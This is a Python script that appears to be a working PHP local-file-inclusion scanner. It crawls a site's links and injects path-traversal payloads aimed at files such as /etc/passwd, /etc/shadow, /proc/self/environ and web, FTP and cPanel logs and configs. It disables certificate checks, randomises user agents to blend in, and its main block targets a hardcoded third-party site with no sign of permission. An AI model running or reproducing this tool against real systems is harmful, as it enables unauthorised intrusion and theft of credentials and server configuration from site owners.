#!/usr/bin/env python3
import dataclasses
import random
import re
import ssl
from typing import Dict, List
from urllib.parse import urlparse
import urllib.request

from bs4 import BeautifulSoup
from bs4.dammit import EncodingDetector

import requests
requests.packages.urllib3.disable_warnings()

from urllib3.exceptions import InsecureRequestWarning

LFI_REGEX = r'=[a-zA-Z0-9-_.!@#%]+'
B64_FILTER = "php://filter/convert.base64-encode/resource="
B64_COMMON_PHP = r".*(PD9waHA|PD9QSFA|PCFET0NUWVBFIEhUTUw\+|PGh0bWw\+).*"

PREFIX_DIC_TRAV = [""
                   , "/"
                   , "../"
                   , "../../"
                   , "../../../"
                   , "../../../../"
                   , "../../../../../"
                   , "../../../../../../"
                   , "../../../../../../../"
                   , "../../../../../../../../"
                   , "../../../../../../../../../"
                   , "//"
                   , "....//"
                   , "....//....//"
                   , "....//....//....//"
                   , "....//....//....//....//"
                   , "....//....//....//....//....//"
                   , "....//....//....//....//....//....//"
                   , "....//....//....//....//....//....//....//"
                   , "....//....//....//....//....//....//....//....//"
                   , "....//....//....//....//....//....//....//....//....//"
                   ]

BASIC_DIC = ["etc/passwd"
             , "etc/passwd%00"
             , "apache2/logs/access.log"
             , "apache2/logs/error.log"
             , "apache/logs/access.log"
             , "apache/logs/error.log"
             , "bin/php.ini"
             , "etc/group"
             , "etc/hosts"
             , "etc/motd"
             , "etc/my.cnf"
             , "etc/mysql/my.cnf"
             , "etc/nginx/nginx.conf"
             , "etc/php.ini"
             , "etc/shadow"
             , "var/log/apache2/access.log"
             , "var/log/access.log"
             , "var/log/access_log"
             , "var/log/error_log"
             , "var/log/error.log"
             ]


ADV_DIC = ["etc/passwd"
             , "etc/passwd%00"
             , "%252e%252e%252f"
             , "apache2/logs/access.log"
             , "apache2/logs/error.log"
             , "apache/logs/access.log"
             , "apache/logs/error.log"
             , "bin/php.ini"
             , "etc/apache2/apache2.conf"
             , "etc/apache2/conf/httpd.conf"
             , "etc/apache2/httpd.conf"
             , "etc/apache2/logs/access.log"
             , "etc/apache2/sites-available/default"
             , "etc/apache2/vhosts.d/default_vhost.include"
             , "etc/apache/apache.conf"
             , "etc/apache/conf/httpd.conf"
             , "etc/apache/httpd.conf"
             , "etc/chrootUsers"
             , "etc/ftpchroot"
             , "etc/ftphosts"
             , "etc/group"
             , "etc/hosts"
             , "etc/http/conf/httpd.conf"
             , "etc/httpd/access.log"
             , "etc/httpd.conf"
             , "etc/httpd/conf.d/vhost.conf"
             , "etc/httpd/conf/httpd.conf"
             , "etc/httpd/httpd.conf"
             , "etc/httpd/logs/access.log"
             , "etc/httpd/logs/access_log"
             , "etc/httpd/logs/error.log"
             , "etc/httpd/logs/error_log"
             , "etc/httpd/php.ini"
             , "etc/http/httpd.conf"
             , "etc/init.d/apache2/httpd.conf"
             , "etc/init.d/apache/httpd.conf"
             , "etc/issue"
             , "etc/logrotate.d/ftp"
             , "etc/logrotate.d/proftpd"
             , "etc/logrotate.d/vsftpd.log"
             , "etc/motd"
             , "etc/my.cnf"
             , "etc/mysql/my.cnf"
             , "etc/nginx/nginx.conf"
             , "etc/passwd"
             , "etc/php4.4/fcgi/php.ini"
             , "etc/php4/apache2/php.ini"
             , "etc/php4/apache/php.ini"
             , "etc/php4/cgi/php.ini"
             , "etc/php5/apache2/php.ini"
             , "etc/php5/apache/php.ini"
             , "etc/php5/cgi/php.ini"
             , "etc/php/apache2/php.ini"
             , "etc/php/apache/php.ini"
             , "etc/php/cgi/php.ini"
             , "etc/php.ini"
             , "etc/php/php4/php.ini"
             , "etc/php/php.ini"
             , "etc/proftp.conf"
             , "etc/proftpd/modules.conf"
             , "etc/protpd/proftpd.conf"
             , "etc/pure-ftpd.conf"
             , "etc/pureftpd.passwd"
             , "etc/pureftpd.pdb"
             , "etc/pure-ftpd/pure-ftpd.conf"
             , "etc/pure-ftpd/pure-ftpd.pdb"
             , "etc/pure-ftpd/pureftpd.pdb"
             , "etc/security/environ"
             , "etc/security/group"
             , "etc/security/limits"
             , "etc/security/passwd"
             , "etc/security/user"
             , "etc/shadow"
             , "etc/vhcs2/proftpd/proftpd.conf"
             , "etc/vsftpd.chroot_list"
             , "etc/vsftpd.conf"
             , "etc/vsftpd/vsftpd.conf"
             , "etc/wu-ftpd/ftpaccess"
             , "etc/wu-ftpd/ftphosts"
             , "etc/wu-ftpd/ftpusers"
             , "home2/bin/stable/apache/php.ini"
             , "home/apache/conf/httpd.conf"
             , "home/apache/httpd.conf"
             , "home/bin/stable/apache/php.ini"
             , "logs/access.log"
             , "logs/access_log"
             , "logs/error.log"
             , "logs/error_log"
             , "logs/pure-ftpd.log"
             , "NetServer/bin/stable/apache/php.ini"
             , "opt/apache2/conf/httpd.conf"
             , "opt/apache/conf/httpd.conf"
             , "opt/lampp/logs/access.log"
             , "opt/lampp/logs/access_log"
             , "opt/lampp/logs/error.log"
             , "opt/lampp/logs/error_log"
             , "opt/xampp/etc/php.ini"
             , "opt/xampp/logs/access.log"
             , "opt/xampp/logs/access_log"
             , "opt/xampp/logs/error.log"
             , "opt/xampp/logs/error_log"
             , "private/etc/httpd/httpd.conf"
             , "private/etc/httpd/httpd.conf.default"
             , "proc/self/environ"
             , "usr/apache2/conf/httpd.conf"
             , "usr/apache/conf/httpd.conf"
             , "usr/etc/pure-ftpd.conf"
             , "usr/lib/php.ini"
             , "usr/lib/php/php.ini"
             , "usr/lib/security/mkuser.default"
             , "usr/local/apache2/conf/httpd.conf"
             , "usr/local/apache2/httpd.conf"
             , "usr/local/apache2/logs/access.log"
             , "usr/local/apache2/logs/access_log"
             , "usr/local/apache2/logs/error.log"
             , "usr/local/apache2/logs/error_log"
             , "usr/local/apache/conf/httpd.conf"
             , "usr/local/apache/conf/php.ini"
             , "usr/local/apache/httpd.conf"
             , "usr/local/apache/logs/access.log"
             , "usr/local/apache/logs/access_log"
             , "usr/local/apache/logs/error.log"
             , "usr/local/apache/logs/error_log"
             , "usr/local/apps/apache2/conf/httpd.conf"
             , "usr/local/apps/apache/conf/httpd.conf"
             , "usr/local/cpanel/logs"
             , "usr/local/cpanel/logs/access_log"
             , "usr/local/cpanel/logs/error_log"
             , "usr/local/cpanel/logs/license_log"
             , "usr/local/cpanel/logs/login_log"
             , "usr/local/cpanel/logs/stats_log"
             , "usr/local/etc/apache22/httpd.conf"
             , "usr/local/etc/apache2/conf/httpd.conf"
             , "usr/local/etc/apache2/httpd.conf"
             , "usr/local/etc/apache/conf/httpd.conf"
             , "usr/local/etc/apache/httpd.conf"
             , "usr/local/etc/apache/vhosts.conf"
             , "usr/local/etc/httpd/conf/httpd.conf"
             , "usr/local/etc/php.ini"
             , "usr/local/etc/pure-ftpd.conf"
             , "usr/local/etc/pureftpd.pdb"
             , "usr/local/httpd/conf/httpd.conf"
             , "usr/local/lib/php.ini"
             , "usr/local/php4/httpd.conf"
             , "usr/local/php4/httpd.conf.php"
             , "usr/local/php4/lib/php.ini"
             , "usr/local/php5/httpd.conf"
             , "usr/local/php5/httpd.conf.php"
             , "usr/local/php5/lib/php.ini"
             , "usr/local/php/httpd.conf"
             , "usr/local/php/httpd.conf.php"
             , "usr/local/php/lib/php.ini"
             , "usr/local/pureftpd/etc/pure-ftpd.conf"
             , "usr/local/pureftpd/etc/pureftpd.pdb"
             , "usr/local/pureftpd/sbin/pure-config.pl"
             , "usr/local/Zend/etc/php.ini"
             , "usr/pkg/etc/httpd/httpd.conf"
             , "usr/pkgsrc/net/pureftpd/"
             , "usr/ports/contrib/pure-ftpd/"
             , "usr/ports/ftp/pure-ftpd/"
             , "usr/ports/net/pure-ftpd/"
             , "usr/sbin/pure-config.pl"
             , "var/adm/log/xferlog"
             , "var/cpanel/cpanel.config"
             , "var/lib/mysql/my.cnf"
             , "var/local/www/conf/php.ini"
             , "var/log/access.log"
             , "var/log/access_log"
             , "var/log/aerror.log"
             , "var/log/apache2/access.log"
             , "var/log/apache2/access_log"
             , "var/log/apache2/error.log"
             , "var/log/apache2/error_log"
             , "var/log/apache/access.log"
             , "var/log/apache/access_log"
             , "var/log/apache/error.log"
             , "var/log/apache/error_log"
             , "var/log/error_log"
             , "var/log/exim/mainlog"
             , "var/log/exim_mainlog"
             , "var/log/exim/paniclog"
             , "var/log/exim_paniclog"
             , "var/log/exim/rejectlog"
             , "var/log/exim_rejectlog"
             , "var/log/ftplog"
             , "var/log/ftp-proxy"
             , "var/log/ftp-proxy/ftp-proxy.log"
             , "var/log/httpd-access.log"
             , "var/log/httpd/access.log"
             , "var/log/httpd/access_log"
             , "var/log/httpd-error.log"
             , "var/log/httpd/error.log"
             , "var/log/httpd/error_log"
             , "var/log/maillog"
             , "var/log/mysqlderror.log"
             , "var/log/mysql.log"
             , "var/log/mysql/mysql-bin.log"
             , "var/log/mysql/mysql.log"
             , "var/log/mysql/mysql-slow.log"
             , "var/log/nginx/access.log"
             , "var/log/nginx/error.log"
             , "var/log/proftpd"
             , "var/log/pureftpd.log"
             , "var/log/pure-ftpd/pure-ftpd.log"
             , "var/log/vsftpd.log"
             , "var/log/xferlog"
             , "var/mysql.log"
             , "var/www/conf/httpd.conf"
             , "var/www/logs/access.log"
             , "var/www/logs/access_log"
             , "var/www/logs/error.log"
             , "var/www/logs/error_log"
             , "var/www/vhosts/sitename/httpdocs//etc/init.d/apache"
             , "Volumes/Macintosh_HD1/opt/apache2/conf/httpd.conf"
             , "Volumes/Macintosh_HD1/opt/apache/conf/httpd.conf"
             , "Volumes/Macintosh_HD1/opt/httpd/conf/httpd.conf"
             , "Volumes/Macintosh_HD1/usr/local/php4/httpd.conf.php"
             , "Volumes/Macintosh_HD1/usr/local/php5/httpd.conf.php"
             , "Volumes/Macintosh_HD1/usr/local/php/httpd.conf.php"
             , "Volumes/Macintosh_HD1/usr/local/php/lib/php.ini"
             , "Volumes/webBackup/opt/apache2/conf/httpd.conf"
             , "Volumes/webBackup/private/etc/httpd/httpd.conf"
             , "Volumes/webBackup/private/etc/httpd/httpd.conf.default"
             , "web/conf/php.ini"
             , "www/logs/proftpd.system.log"
             ]

@dataclasses.dataclass
class GENUA:
    random_user_agent: str


def random_ua():
    USER_AGENT_PARTS = {
        'os': {
            'linux': {
                'name': ['Linux x86_64', 'Linux i386'],
                'ext': ['X11']
            },
            'windows': {
                'name': ['Windows NT 10.0', 'Windows NT 6.1', 'Windows NT 6.3', 'Windows NT 5.1', 'Windows NT.6.2'],
                'ext': ['WOW64', 'Win64; x64']
            },
            'mac': {
                'name': ['Macintosh'],
                'ext': ['Intel Mac OS X %d_%d_%d' % (random.randint(10, 11), random.randint(0, 9), random.randint(0, 5))
                        for
                        i in range(1, 10)]
            },
        },
        'platform': {
            'webkit': {
                'name': ['AppleWebKit/%d.%d' % (random.randint(535, 537), random.randint(1, 36)) for i in range(1, 30)],
                'details': ['KHTML, like Gecko'],
                'extensions': ['Chrome/%d.0.%d.%d Safari/%d.%d' % (
                    random.randint(6, 32), random.randint(100, 2000), random.randint(0, 100), random.randint(535, 537),
                    random.randint(1, 36)) for i in range(1, 30)] + ['Version/%d.%d.%d Safari/%d.%d' % (
                    random.randint(4, 6), random.randint(0, 1), random.randint(0, 9), random.randint(535, 537),
                    random.randint(1, 36)) for i in range(1, 10)]
            },
            'iexplorer': {
                'browser_info': {
                    'name': ['MSIE 6.0', 'MSIE 6.1', 'MSIE 7.0', 'MSIE 7.0b', 'MSIE 8.0', 'MSIE 9.0', 'MSIE 10.0'],
                    'ext_pre': ['compatible', 'Windows; U'],
                    'ext_post': ['Trident/%d.0' % i for i in range(4, 6)] + [
                        '.NET CLR %d.%d.%d' % (random.randint(1, 3), random.randint(0, 5), random.randint(1000, 30000))
                        for
                        i in range(1, 10)]
                }
            },
            'gecko': {
                'name': ['Gecko/%d%02d%02d Firefox/%d.0' % (
                    random.randint(2001, 2010), random.randint(1, 31), random.randint(1, 12), random.randint(10, 25))
                            for i
                            in
                            range(1, 30)],
                'details': [],
                'extensions': []
            }
        }
    }
    # Mozilla/[version] ([system and browser information]) [platform] ([platform details]) [extensions]
    ## Mozilla Version
    mozilla_version = "Mozilla/5.0"  # hardcoded for now, almost every browser is on this version except IE6
    ## System And Browser Information
    # Choose random OS
    os = USER_AGENT_PARTS.get('os')[random.choice(list(USER_AGENT_PARTS.get('os').keys()))]
    os_name = random.choice(os.get('name'))
    sysinfo = os_name
    # Choose random platform
    platform = USER_AGENT_PARTS.get('platform')[random.choice(list(USER_AGENT_PARTS.get('platform').keys()))]
    # Get Browser Information if available
    if 'browser_info' in platform and platform.get('browser_info'):
        browser = platform.get('browser_info')
        browser_string = random.choice(browser.get('name'))
        if 'ext_pre' in browser:
            browser_string = "%s; %s" % (random.choice(browser.get('ext_pre')), browser_string)
        sysinfo = "%s; %s" % (browser_string, sysinfo)
        if 'ext_post' in browser:
            sysinfo = "%s; %s" % (sysinfo, random.choice(browser.get('ext_post')))
    if 'ext' in os and os.get('ext'):
        sysinfo = "%s; %s" % (sysinfo, random.choice(os.get('ext')))
    ua_string = "%s (%s)" % (mozilla_version, sysinfo)
    if 'name' in platform and platform.get('name'):
        ua_string = "%s %s" % (ua_string, random.choice(platform.get('name')))
    if 'details' in platform and platform.get('details'):
        ua_string = "%s (%s)" % (
            ua_string,
            random.choice(platform.get('details')) if len(platform.get('details')) > 1 else platform.get(
                'details').pop())
    if 'extensions' in platform and platform.get('extensions'):
        ua_string = "%s %s" % (ua_string, random.choice(platform.get('extensions')))
    
    return ua_string


@dataclasses.dataclass
class WEBCrawler:
    link: str

def build_dic_links(url: str) -> List[WEBCrawler]:
    """ Web page crawler """
    links = []
    parser = 'html.parser'
    UA = {'User-Agent' :random_ua()}
    
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.session_stats()
    
    resp_param = urllib.request.Request(url, data=None, headers=UA)
    try:
        resp = urllib.request.urlopen(resp_param, context=ctx,timeout=10)
        soup = BeautifulSoup(resp, parser, from_encoding=resp.info().get_param('charset'))

        for link in soup.find_all('a', href=True):
            if link['href'].startswith("/"):
                links.append(url + link['href'])
            elif not link['href'].startswith("http://") and not link['href'].startswith("https://"):
                links.append(url + '/' + link['href'])
            else:
                links.append(link['href'])
    except Exception as e:
        print(f"[-] error: {e}")

    return links


@dataclasses.dataclass
class LFICandidate:
    link: str
    param: str


def get_lfi_candidates(url: str) -> List[LFICandidate]:
    """ Checking link param """
    result = []
    
    if match:= re.findall(LFI_REGEX, url):
        result.append(LFICandidate(link=url, param=match))
    else:
        result.append(LFICandidate(link=url, param=None))

    return result


@dataclasses.dataclass
class PHPLFIScanner:
    """ Tries to detect and verify PHP LFI vulnerabilities """

    def scan(self, url: str) -> None:
        UA = {'User-Agent' :random_ua()}
        try:
            response = requests.get(url, verify=False, headers=UA)
        except Exception as e:
            print(f"[-] {e}")
            return
        
        print(f"[+] response: {response.status_code} for {url}")

        if response.status_code != 200:
            print(f"[-] {url} does not exist. Respons status code {response.status_code}")
            return

        LLinks = build_dic_links(url)
        print(f"[+] {len(LLinks)} links discover on page {url} ")

        for link in LLinks:
            print(f"[*] Checking {link}")
            for candidate in get_lfi_candidates(link):              
                if candidate.param != None:
                    print(f'[+] Candidate.link: {candidate.link}')
                    RESULT_LIST = []
                    RESULT_LIST_LENGTH = []
                    RESULT_LIST_POSITIVE = []

                    if not candidate.link.startswith(url):
                        print(f'[-] Candidate.link: {candidate.link} outside workspace not checking.')
                    else:
                        for next_param in candidate.param:
                            #print(f'[-] Param: {isinstance(next_param.replace("=",""), int)} {next_param.replace("=","")}')
                            spr = 0
                            try:
                                spr = int(next_param.replace("=",""))
                                if isinstance(spr, int):
                                    print(f'[-] Param: {spr} false positive not checking.')
                            except Exception as e:
                                for pre in PREFIX_DIC_TRAV:
                                    for att_param in BASIC_DIC:
                                        att_param = pre+att_param
                                        url_encode = requests.utils.quote(att_param)
                                        lfi_test_url = candidate.link.replace(next_param, "="+url_encode)
                                        #cookies = {'security': 'low'}
                                        try:
                                            #response = requests.get(lfi_test_url, allow_redirects=False, cookies=cookies, verify=False)
                                            response = requests.get(lfi_test_url, allow_redirects=False, verify=False)
                                        except Exception as e:
                                            print(f"Error:{e}")
                                        
                                        if response.status_code == 200:
                                            print(f"[*] Checking... 200 OK {lfi_test_url}")
                                            
                                            RESULT_LIST.append([len(response.content.decode('utf-8', errors='ignore')), candidate.link, lfi_test_url, next_param, att_param])
                                            RESULT_LIST_LENGTH.append(len(response.content.decode('utf-8', errors='ignore')))
                                        else:
                                            print(f'[-] LFI not exploitable in: {lfi_test_url }. Response status code: {response.status_code}')


                    for item in RESULT_LIST_LENGTH:
                        if(RESULT_LIST_LENGTH.count(item) <= 11):
                            for i in RESULT_LIST:
                                if i[0] == item:
                                    RESULT_LIST_POSITIVE.append(i)
                    
                    #zapis do pliku wyniku
                    parsed_url = urlparse(url)
                    nazwa = parsed_url.hostname + parsed_url.path.replace("/", "_")
                    file = open(f'{nazwa}.txt','w')

                    for item in RESULT_LIST_POSITIVE:
                        print(f"[+] {item}")
                        file.write(str(item))
                        file.write("\n")
                    
                    file.close()


if __name__ == "__main__":
    PHPLFIScanner().scan("http://nvgazeta.ru")
